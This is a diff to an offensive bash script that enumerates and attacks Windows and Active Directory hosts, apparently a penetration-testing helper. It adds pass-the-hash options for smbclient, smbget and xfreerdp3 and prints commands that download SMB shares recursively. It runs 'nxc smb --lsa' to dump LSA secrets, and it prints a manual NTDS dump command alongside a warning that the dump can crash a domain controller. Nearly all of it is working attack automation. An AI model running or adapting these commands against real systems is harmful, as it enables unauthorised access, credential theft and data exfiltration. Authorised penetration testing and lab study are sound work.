@@ -566,12 +566,26 @@ check_and_suggest() {
             IMPACKET_CREDS="$domain/$user@$IP -hashes :$hash"
             WINRM_CREDS="-i $IP -u '$user' -H '$hash'"
             LDAP_IMPACKET="impacket-ldap-shell $domain/$user@$IP -hashes :$hash"
-            SMBCLIENT_AUTH="-U '$domain/$user' --pw-nt-hash '$hash'"
+            if [ -n "$domain" ]; then
+                SMBCLIENT_AUTH="-U '$domain\\$user' --pw-nt-hash $hash"
+                SMBGET_USER="$domain/$user%$hash"
+            else
+                SMBCLIENT_AUTH="-U '$user' --pw-nt-hash $hash"
+                SMBGET_USER="$user%$hash"
+            fi
+            XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
         else
             IMPACKET_CREDS="$domain/$user:$pass@$IP"
             WINRM_CREDS="-i $IP -u '$user' -p '$pass'"
             LDAP_IMPACKET="impacket-ldap-shell '$domain/$user:$pass@$IP'"
-            SMBCLIENT_AUTH="-U '$domain/$user%$pass'"
+            if [ -n "$domain" ]; then
+                SMBCLIENT_AUTH="-U '$domain\\$user%$pass'"
+                SMBGET_USER="$domain/$user%$pass"
+            else
+                SMBCLIENT_AUTH="-U '$user%$pass'"
+                SMBGET_USER="$user%$pass"
+            fi
+            XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
         fi
 
         case $service in
@@ -639,9 +653,14 @@ check_and_suggest() {
                         share=${share#\\}
                         if [ ! -z "$share" ]; then
                             echo "# Download $share recursively:"
-                            echo "smbget -R smb://$IP/$share -U '$SMBCLIENT_AUTH'"
-                            echo "# Or with smbclient (interactive):"
-                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                            if [ -n "$hash" ]; then
+                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                                echo "# Note: smbget doesn't support --pw-nt-hash, use smbclient above"
+                            else
+                                echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
+                                echo "# Or with smbclient (interactive):"
+                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                            fi
                             echo ""
                         fi
                     fi
@@ -774,9 +793,9 @@ if [ "$os_type" = "windows" ]; then
         if echo "$rdp_output" | grep -q "\[+\]"; then
             echo -e "\n\033[92m[+] RDP access successful! Connect with:\033[0m"
             if [ -n "$domain" ]; then
-                echo "xfreerdp3 /v:$IP /u:$domain\\\\$user /p:'$pass' /cert:ignore /clipboard /dynamic-resolution"
+                echo "xfreerdp3 /v:$IP /u:$domain\\\\$user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
             else
-                echo "xfreerdp3 /v:$IP /u:$user /p:'$pass' /cert:ignore /clipboard /dynamic-resolution"
+                echo "xfreerdp3 /v:$IP /u:$user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
             fi
             echo ""
             echo "# Or with rdesktop:"
@@ -865,12 +884,9 @@ if [ "$os_type" = "windows" ]; then
     fi
     
     # Redundant share listing removed (already checked in validation)
+    # User enumeration removed (already done in initial LDAP domain SID check at line ~100)
     
     if [ -n "$user" ]; then
-        echo -e "\n\033[96m[+] Enumerating domain users\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --users 2>/dev/null | tee nxc-enum/smb/users.txt
-        unbuffer nxc ldap $IP $USER_FLAG --users --active-users 2>/dev/null | tee nxc-enum/ldap/active-users.txt
-    
         echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
         unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
     
@@ -1035,7 +1051,12 @@ if [ "$os_type" = "windows" ]; then
         echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"
     
         echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
-        timeout 5s unbuffer nxc vnc $IP $USER_FLAG | tee nxc-enum/smb/vnc-credentials.txt
+        # VNC doesn't support hash authentication, only password
+        if [ -n "$pass" ]; then
+            timeout 5s unbuffer nxc vnc $IP -u "$user" -p "$pass" | tee nxc-enum/smb/vnc-credentials.txt
+        else
+            echo -e "\033[93m[!] Skipping VNC check (VNC requires password, not hash)\033[0m"
+        fi
     
         echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"
     
@@ -1054,7 +1075,11 @@ if [ "$os_type" = "windows" ]; then
         unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt
     
         echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
+        echo -e "\033[93m[!] Note: NTDS dump can crash DC on Windows Server 2019. Skipping by default.\033[0m"
+        echo -e "\033[96m[+] Alternative: Use impacket-secretsdump (already run in RPC section above)\033[0m"
+        echo -e "\033[96m[+] Or manually run: nxc smb $IP $USER_FLAG --ntds\033[0m"
+        # Auto-answer 'n' to skip the interactive prompt
+        # echo 'n' | unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
     else
         echo -e "\n\033[93m[!] Skipping Additional Windows Enumeration (no username supplied)\033[0m"
     fi
